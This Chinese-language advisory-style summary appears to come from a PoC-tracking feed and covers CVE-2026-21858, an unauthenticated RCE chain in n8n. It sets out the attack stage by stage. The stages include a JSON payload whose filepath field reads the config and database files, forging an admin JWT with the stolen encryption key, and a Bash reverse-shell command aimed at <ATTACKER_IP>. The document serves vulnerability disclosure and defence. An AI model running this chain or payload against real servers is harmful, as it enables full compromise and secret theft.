## CVE-2026-21858 - n8n 远程代码执行 (RCE)

**漏洞编号:** CVE-2026-21858

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** n8n

**危害等级:** 最高严重级别，超危漏洞

**CVSS评分:** 10.0

**影响版本:** 1.65.0 到 1.121.0

**利用条件:** 无需认证，远程网络访问

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

提供的POC信息，以 `ATTACKVECTOR.md` 的形式呈现，对 `CVE-2026-21858`（代号 "Ni8mare"）漏洞提供了一个极其详细和完整的攻击链描述。该文档清晰地阐述了如何从未经身份验证的远程访问，通过一系列链式漏洞最终实现远程代码执行（RCE）。攻击概述部分明确指出，该漏洞利用复杂度低且完全可自动化，无需任何特权或用户交互。文档通过5个明确的攻击阶段（侦察与发现、武器化 - Content-Type 混淆、数据窃取 - 任意文件读取、利用 - 会话伪造、安装 - RCE）详细描绘了攻击流程。它不仅提供了每个阶段的技术细节，包括具体的JSON payload示例、目标文件路径，还指出了相关的MITRE ATT&CK技术ID。这种结构化的描述使得漏洞的复现和理解变得非常直接和高效。鉴于其详细程度和链式攻击的完整性，该POC具备极高的有效性，能够指导攻击者或防御者完整地理解和模拟攻击过程，从而验证漏洞并构建有效的防御措施。

**利用步骤:**
1.  **阶段1：侦察与发现 (T1595)**：攻击者首先通过Shodan/Censys等工具识别暴露在互联网上的n8n实例，查找包含"n8n"的HTTP HTML内容或标题。随后，识别启用了“表单Webhook节点”的活跃Webhook端点。最后，通过检查HTTP头或静态文件指纹识别受影响的版本范围，即1.65.0到1.121.0之间。
2.  **阶段2：武器化 - Content-Type 混淆 (T1190)**：此阶段利用了 `parseRequestBody()` 函数在处理HTTP请求体时未能区分 `multipart/form-data` 和 `application/json` 负载的缺陷。攻击者向预期文件上传的端点发送一个恶意的JSON负载。该JSON负载包含一个 `filepath` 字段，指向目标系统上的任意本地文件，例如 `{"filepath": "/home/node/.n8n/config", "mimetype": "application/json", "filename": "pwn.json"}`。n8n系统错误地将此用户定义的本地路径视为新上传的文件。
3.  **阶段3：数据窃取 - 任意文件读取 (T1083)**：由于上述Content-Type混淆，`prepareFormReturnItem()` 函数会将指定路径的文件从注入的 `filepath` 复制到一个可公开访问的n8n目录中。攻击者的主要目标是窃取敏感文件，如包含加密密钥的 `config` 文件和包含用户哈希的 `database.sqlite`。成功后，攻击者将获取静态系统加密密钥 `N8N_ENCRYPTION_KEY`。
4.  **阶段4：利用 - 会话伪造 (T1550.004)**：攻击者利用窃取的 `N8N_ENCRYPTION_KEY` 生成一个有效的JWT（JSON Web Token）。JWT使用HS256算法签名，并以 `n8n-auth` 作为Cookie名称。通过将伪造的JWT发送到服务器，攻击者可以完全绕过身份验证机制，获得Owner/Admin级别的权限。
5.  **阶段5：安装 - RCE via Workflow (T1059.003)**：一旦获得管理员权限，攻击者通过n8n的REST API自动化创建一个新的工作流。该工作流包含一个“执行命令或代码节点”（Node.js），用于执行任意系统命令，例如一个Bash反向Shell命令：`bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"`。这最终导致服务器被完全控制，实现远程代码执行。

**投毒风险分析:**
本分析中提供的POC是一个名为 `ATTACKVECTOR.md` 的Markdown文档，它详细描述了攻击链、利用方法和具体的攻击载荷示例（如JSON数据、Bash反向Shell命令）。重要的是，这个Markdown文档本身并非可执行代码。它是一份**技术说明文档**，用于解释漏洞的原理和利用步骤，而不是一个可以直接运行的脚本或程序。因此，**这份POC文档本身的投毒风险被评估为低**。

具体来说：
*   **代码清晰可读性高**：Markdown格式使其内容清晰易懂，没有混淆代码或难以理解的逻辑。
*   **无直接执行恶意代码**：文档中描述的恶意载荷（如反向Shell命令）是作为成功利用漏洞后攻击者会执行的“下一步”操作示例，而不是文档自身包含的、读者在查看文档时就会执行的恶意代码。
*   **标准库依赖**：作为文档，它不涉及任何程序性依赖或外部库。
*   **无可疑外部请求**：文档本身不会尝试连接任何外部恶意服务器。

需要强调的是，低投毒风险仅指这份Markdown文档作为“POC本身”的安全性。文档中**描述的攻击方法和攻击载荷**（例如反向Shell命令）一旦被恶意攻击者实际执行，将导致严重的安全后果，包括系统沦陷。防御者在利用此类POC进行测试或分析时，应将文档中提供的攻击载荷视为潜在的威胁示例，并在受控环境中进行操作。总而言之，此POC（文档形式）旨在提供信息和指导，而非携带病毒或后门。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2026-21858
